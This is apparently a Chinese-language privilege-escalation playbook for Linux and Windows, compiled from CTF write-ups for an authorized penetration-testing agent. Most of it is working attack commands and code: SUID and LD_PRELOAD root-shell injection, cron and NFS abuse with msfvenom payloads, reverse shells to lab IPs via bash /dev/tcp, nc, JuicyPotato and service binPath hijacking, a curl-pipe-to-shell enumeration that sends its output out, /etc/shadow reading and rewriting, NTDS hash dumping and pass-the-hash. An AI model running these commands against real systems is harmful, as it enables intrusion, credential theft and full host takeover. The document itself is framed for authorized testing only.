# Linux/Windows 本机提权检查方法论（实战沉淀）

> 来源：用户博客「Linux 提权专区」「Windows 提权专区」+ 多篇 writeup 提权段（Bastard/Cap/Conversor/Expressway/Inject/Pov/Return/Json/Lampiao/Venom/DarkHole/EvilBox One/Blackfield/Sauna）。命令逐字摘自原文并标注来源。
> 触发场景：拿到低权限 shell（www-data / 普通用户 / 服务账号）后评估本机提权路径。
> 双层结构（红线兼容）：§1 枚举层**默认可做**（只读，与 Phase 4「拿到 shell 立即确认权限」天然兼容）；§3 每条前挂门控「仅 Phase 0 授权明确允许提权时」；§4 复述默认立场。**仅限授权测试。**

---

## 1. 枚举层（默认可做：只读，与 Phase 4 拿到 shell 确认权限天然兼容）

### 1.1 Linux 六查

| # | 查什么 | 命令 | 信号 | 来源 |
|---|---|---|---|---|
| 1 | sudo 权限 | `sudo -l` | `NOPASSWD:` 二进制、`env_keep+=LD_PRELOAD`、`(ALL, !root)` 异常规则 | Linux 提权专区 |
| 2 | SUID | `find / -perm -u=s -type f 2>/dev/null` | 超出默认清单的可疑二进制（如 `/usr/local/bin/suid-so`） | Linux 提权专区 |
| 3 | capabilities | `getcap -r / 2>/dev/null` | `cap_setuid` 等能力位（§3.6 三行写法） | Linux 提权专区 |
| 4 | cron | `cat /etc/crontab` | root 跑的脚本；`PATH=` 行是否以用户可写目录开头 | Linux 提权专区 |
| 5 | NFS | `cat /etc/exports` | `no_root_squash` 选项 | Linux 提权专区 |
| 6 | 内核 | `uname -a;lsb_release -a;cat /proc/version /etc/issue /etc/*-release` | 老内核（搜 exp 纪律 §3.5，最后一步） | Linux 提权专区 |

顺带：`sudo -V` 定 sudo 版本（§3.4 前置）；`ls -liah`、`history`、`cat /etc/passwd` 过一遍（组位 `-rw-r--rw-` 即 §3.7 信号）。LinPEAS 无痕回传（不落盘）：`curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 81`，kali 侧 `nc -lvnp 81 | tee linpeas.out`（来源：Linux 提权专区）。

**独家技巧：sudo 报错回读 shadow**——`sudo -l` 允许某二进制但它本身无已知漏洞时，借它「读文件当配置」的行为读出 `/etc/shadow`，**报错内容即文件内容**：

```bash
sudo apache2 -f /etc/shadow   # -f 指定替代配置文件，报错带出 shadow 第一行
sudo date -f /etc/shadow      # date -f 逐行当日期解析，每行一条 invalid date = 全文回读
```

原文原理：「Apache2 帮助信息提示它有一个支持加载替代配置文件的选项 -f……产生一条此错误信息，包含 /etc/shadow 文件的第一行数据」。纪律：证明可读即止——首行足以作证据，不导出全文、不做离线破解（属 §3 门控）。（来源：Linux 提权专区）

### 1.2 Windows 五查

| # | 查什么 | 命令 | 信号 | 来源 |
|---|---|---|---|---|
| 1 | 令牌特权 | `whoami /priv` | Enabled 的 SeImpersonate / SeBackup / SeDebug / SeLoadDriver | Windows 提权专区 |
| 2 | 组与服务配置权 | `whoami /groups`（快筛 `whoami /groups \| findstr /i "operators"`） | Server Operators / Backup Operators 成员 | HTB-Return |
| 3 | 已装补丁 | `systeminfo` | 原文注记「Hotfix(s)：补丁安装情况」——无补丁+老版本=内核/服务 CVE 面大 | Windows 提权专区 |
| 4 | 进程与账号 | `tasklist \| findstr <PID>`、`net user <用户>` | 服务进程、可疑账号 | Windows 提权专区 |
| 5 | 自动化兜底 | `.\winPEAS.exe log` | AlwaysInstallElevated、计划任务等——两项无原文手工命令，按反幻觉硬约束不凭记忆补，以 winPEAS 输出为准 | HTB-Sauna |

## 2. 触发信号 → 路径决策表

### 2.1 Linux

| 触发信号 | 路径 |
|---|---|
| `sudo -l` 出二进制 | 先查 gtfobins.github.io（原文：「从此条开始下面数个提权演示命令参考 GTFOBins」）§3.1 |
| `env_keep+=LD_PRELOAD` | LD_PRELOAD 注入 §3.6 |
| `sudo -V` < 1.8.28 且规则含 `(ALL, !root)` | CVE-2019-14287 §3.4 |
| `sudo -V` 1.9.14–1.9.17 | CVE-2025-32463 §3.4 |
| cron 每分钟 root 跑脚本 | 文件 / PATH / 通配符三向排查 §3.3 |
| SUID 清单出现可疑二进制 | `strings` 找 so 路径 → `strace` 证实加载失败 → 注入 §3.2 |
| `getcap` 见 `cap_setuid` | python setuid 一行 §3.6 |
| `/etc/exports` 有 `no_root_squash` | NFS 放 suid elf §3.3 |
| `/etc/shadow`、`/etc/passwd` 组位可写 | 直改 §3.7 |
| 无凭据但要摸清 root 定时任务 | pspy64 挂机盯 `UID=0` CMD §3.6 |
| `sudo -l` 出 `needrestart` | `-c` 加载任意 conf §3.6 |
| 内核版本老 | 搜 exp——**最后一步** §3.5 |

### 2.2 Windows（令牌 → 工具映射）

| 令牌 / 信号 | 映射 |
|---|---|
| SeImpersonate / SeAssignPrimaryToken（服务账号常态） | PrintSpoofer 优先；OS 小于 Windows Server 2019 且开启 SeImpersonate → JuicyPotato（Bastard 原文决策）§3.8 |
| SeBackupPrivilege | diskshadow 挂卷影 → robocopy /b 抽 ntds.dit → secretsdump → evil-winrm -H §3.9 |
| SeDebugPrivilege | 迁移 winlogon.exe §3.10 |
| Server Operators 组 | 改服务 binPath §3.10 |
| SeLoadDriverPrivilege | PrintNightmare（CVE-2021-34527，原文权限映射） |
| 发现 CLIXML / 凭据文件 | import-clixml 还原明文 → RunasCs 切用户 §3.10 |

## 3. 利用层（每条前置门控：仅 Phase 0 授权明确允许提权时）

以下均为**实际提权操作**。进入条件：Phase 0 授权逐条确认允许「可提权」。无授权止步于 §1 的路径存在证明（§4）。

### 3.1 【门控】GTFOBins 代表命令

40+ 个二进制不逐条搬运，查 gtfobins.github.io（原文：「从此条开始下面数个提权演示命令参考 GTFOBins」）：

```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
sudo mount -o bind /bin/bash /bin/mount     # 随后 sudo /bin/mount
sudo install -m =xs $(which find) .         # 随后 ./find . -exec /bin/bash -p \; -quit
```

（来源：前 3 条 Linux 提权专区；第 4 条 Venom）

### 3.2 【门控】SUID so 注入

两步定位：`strings /usr/local/bin/suid-so` 输出出现 `/home/user/.config/libcalc.so` → `strace /usr/local/bin/suid-so 2>&1 | grep 'home'` 确认 `open(...) = -1 ENOENT`。再在可控目录放同名 so，constructor 自动执行：

```c
#include <stdio.h>
#include <stdlib.h>

static void injetc() __attribute__((constructor));

void injetc() {
        setuid(0);
        system("/bin/bash -p");
}
```

`gcc -shared -fPIC -o libcalc.so libcalc.c` 后再执行 SUID 二进制即 root。bash < 4.2-048 变体：`function /usr/sbin/service { /bin/bash -p; }` + `export -f /usr/sbin/service`。（来源：Linux 提权专区）

**SUID 相对路径调用 → PATH 劫持**（SUID 程序内部以**相对路径**调用外部命令时；来源：Credit Card Scammers Writeup）：`find / -perm -u=s -type f 2>/dev/null` 锁定 `/usr/bin/backup`（strings 见内部调用 `tar` 而非绝对路径）→ `export PATH=.:$PATH` + `cd /tmp` + `echo '/bin/bash' > tar` + `chmod 777 tar` → 执行 `/usr/bin/backup`，其 `tar` 解析到 `/tmp/tar` 得 root。与 §3.3 cron PATH 向同型技术、不同触发面（SUID vs cron）——枚举到「内部调用外部命令」的 SUID 二进制时 strings 一遍再走。

### 3.3 【门控】cron 三向 + NFS no_root_squash

`cat /etc/crontab` 发现 `* * * * * root overwrite.sh` 与 `/usr/local/bin/compress.sh` 后三向排查：

1. **文件向**：`ls -liah /usr/local/bin/overwrite.sh` 见 `-rwxr--rw- 1 root staff`（组可写）→ 改脚本内容（原文写入 `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`）。
2. **PATH 向**：crontab 的 `PATH=/home/user:/usr/local/sbin:...` 以家目录开头 → 家目录放同名 `overwrite.sh`（`cp /bin/bash /tmp/rootBash2` + `chmod +xs /tmp/rootBash2`）→ 执行后 `/tmp/rootBash2 -p`。
3. **通配符向**：compress.sh 内 `cd /home/user` + `tar czf /tmp/backup.tar.gz *` → kali `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf`，靶机 `chmod +xs shell.elf`，再 `touch /home/user/--checkpoint=1` + `touch /home/user/--checkpoint-action=exec=shell.elf`。

NFS（`cat /etc/exports` 见 `/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`）：kali 以 root `mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs` → `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell1.elf` → `chmod +xs shell1.elf` → 靶机执行 `/tmp/shell1.elf`。（来源：Linux 提权专区）

### 3.4 【门控】sudo 版本双 CVE

- **CVE-2019-14287**（< 1.8.28，1.8.28p1 修复）：规则 `(ALL, !root) NOPASSWD: /bin/bash` 时 `sudo -u#-1 /bin/bash`——UID -1 被 sudo 错误读取为 0。
- **CVE-2025-32463**（1.9.14–1.9.17，1.9.17p1 修复）：`sudo -V` 定版本 → `git clone https://github.com/MohamedKarrab/CVE-2025-32463.git` → 靶机 `./get_root.sh`。Expressway 实战链：TCP 仅 22 时补 UDP 全端口见 500/isakmp → `sudo ike-scan -M -A --pskcrack=enil.hash 10.129.1.84` → `psk-crack -d /usr/share/wordlists/rockyou.txt enil.hash` → ssh 登录 → `sudo -V` 见 1.9.17 → 命中本 CVE。

（来源：Linux 提权专区，含 Expressway 段）

### 3.5 【门控】内核 exp 纪律

- 教训原文：「在 github 上下载的 内核提权 利用会导致靶机崩溃。解决：使用 searchsploit 库中的 dirty cow 利用」→ `searchsploit dirty cow` → `searchsploit -m 40847`。
- 排序：「内核漏洞利用往往是攻击者采取的最后一步」——先穷尽 §1/§2 用户态路径。
- 搜索口径：「使用 `cat /proc/version` 或 `uname -a` 获得内核版本后，在搜索利用是不必过于具体地指定内核版本，宽严并用」。
- 崩溃前提：「在尝试内核漏洞利用之前，请确保这种潜在的结果在渗透测试范围内是可接受的」。

（来源：Linux 提权专区 / Lampiao）

### 3.6 【门控】Linux 散点

- **getcap setuid「Cap 三行写法」**：
  ```bash
  getcap -r / 2>/dev/null
  /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
  /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
  （第 2 行为第 1 行输出；第 3 行即提权。来源：HTB-Cap / Linux 提权专区）
- **pspy 无凭据抓 root 定时任务**（HTB-Inject）：`./pspy64` 挂机盯 `CMD: UID=0` 行——本例 `/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml`；`ls -liah` 见 tasks 目录 `drwxrwxr-x root staff` 且 `id` 见 staff → 写含 `shell: bash -c 'bash -i >& /dev/tcp/10.10.16.34/4444 0>&1'` 的 yml 放 tasks/。
- **needrestart**（HTB-Conversor）：`sudo -l` 出 `/usr/sbin/needrestart` → `sudo /usr/sbin/needrestart -c /tmp/enil.conf`（`-c` 以 root 加载任意 conf）。
- **LD_PRELOAD**（Linux 提权专区）：`shell.c` 写 `void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }` → `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` → `sudo LD_PRELOAD=/tmp/env_privTEST/shell.so find`。

### 3.7 【门控】可写 shadow / passwd 直改

`ls -liah /etc/shadow` 见 `-rw-r--rw-`：`cp /etc/shadow /tmp/shadow.bak` 备份 → kali `mkpasswd -m sha-512 <口令>` 生成 → `vim /etc/shadow` 替换 root 行。`/etc/passwd` 组位可写同理：`openssl passwd admin` 生成 hash 替换 root 的 `x` 位。（来源：Linux 提权专区 / EvilBox One）

### 3.8 【门控】SeImpersonate 全家族

首选 PrintSpoofer：`PrintSpoofer64.exe -i -c cmd.exe`（落地：`certutil.exe -urlcache -split -f http://10.10.16.46/JuicyPotato.exe` 或 `copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe`）。家族清单（原文）：Rotten / Juicy / Rogue / Sweet Potato / Potato.exe / Smail Potato / Ghost Potato——滥用权限均为 `SeImpersonatePrivilege` 或 `SeAssignPrimaryTokenPrivilege`。OS 版本决策（原文）：「靶机的操作系统为小于 Windows Server 2019，且开启了 SeImpersonate。可以使用 juicy-potato 提权」：

```bash
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal7.54\nc64.exe -e cmd.exe 10.10.16.46 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

（来源：Windows 提权专区 / HTB-Json / Bastard）

### 3.9 【门控】SeBackup 全链

1. kali 制卷影脚本（`\r\n` 行尾）：`printf 'set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n' > dshadow.txt`
2. evil-winrm `upload dshadow.txt`；挂载验证 `ls Z:\Windows\NTDS`（原文未展示 diskshadow 调用行，以此验证挂载成功）。
3. 抽文件：`robocopy /b Z:\Windows\NTDS C:\programdata\apps\ntds ntds.dit` + `reg save HKLM\SYSTEM C:\programdata\apps\ntds\SYSTEM`。
4. `download` 回 kali → `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt`。
5. `evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee`（PtH 拿 SYSTEM）。

（来源：HTB-Blackfield / Windows 提权专区）

### 3.10 【门控】Windows 散点

- **CLIXML 还原 + RunasCs**（HTB-Pov）：`$cred = import-clixml -Path connection.xml` → `$cred.GetNetworkCredential().UserName` / `.Password` 得明文 → `.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.58:408` 切高权限用户反连。
- **SeDebug → 迁移 winlogon**（HTB-Pov）：meterpreter `ps` 找 `winlogon.exe` PID → `migrate <PID>` → `getuid` 确认 `NT AUTHORITY\SYSTEM`。
- **服务 binPath 劫持**（HTB-Return）：Server Operators 组 → `sc.exe config VSS binPath="C:\programdata\apps\nc64.exe -e cmd.exe 10.10.16.58 443"` → `sc.exe start VSS`（原文 `StartService FAILED 1053` 但监听端已收到 SYSTEM shell）。
- **Defender 排除目录识别**（HTB-Acute）：可读目录里隐藏 `desktop.ini` 出现 `InfoTip=Directory for Testing Files without Defender` → 该目录免杀，工具落地首选（`Invoke-WebRequest -Uri http://10.10.16.58/nc64.exe -OutFile C:\Utils\nc64.exe`）。这是**观察点**不是提权动作——发现即用，无需额外操作。

## 4. 红线对齐段

**skill 默认立场（复述，SKILL.md Phase 4）**：「默认禁止：RCE 落地、建立持久化、横向移动、数据批量导出」；「拿到 shell → 立即确认权限、主机名、网段，**不做**凭据 dump 与横向，除非授权写明」。提权类操作属默认禁止——进入 §3 的唯一门是 Phase 0 授权**逐条确认**「可执行代码 / 可提权 / 可横向」。

**rce-deserialization.md 先例（本 note 执行口径）**：该 playbook 合规边界明写「禁：尝试提权（sudo/SUID/kernel exploit）」「只跑只读命令：`id`/`whoami`/`uname -a`/`cat /etc/issue`」——即**证明能执行 id 即可**。对应到提权场景：

- **无授权（默认）**：止步于「路径存在证明」——§1 枚举产出（`sudo -l` 规则、SUID 清单、`whoami /priv` 的 Enabled 特权、`no_root_squash` 导出项）本身就是 finding，报告写「存在提权路径 X，未实际利用（按授权边界）」，附枚举输出为证据。
- **有授权（明确允许提权）**：按最小必要进 §3，每步记录命令与结果；优先可逆、低破坏路径（GTFOBins / cron / 服务配置），内核 exp 永远最后（§3.5 崩溃风险）。
- **凭据类红线**：shadow 读取仅证明可读（§1 独家技巧首行即止）；shadow/passwd 直改、NTDS 哈希恢复、RunasCs 切用户均属 §3 门控内操作，未授权一律不做。
- **内核 exp 特别红线**：无书面许可绝对禁止——「在尝试内核漏洞利用之前，请确保这种潜在的结果在渗透测试范围内是可接受的」。

**边界声明**：本 note 仅限授权测试。所有命令逐字摘自标注来源文章；落地前按反幻觉硬约束复核原文/权威库（gtfobins.github.io、Exploit-DB），不凭记忆改写。
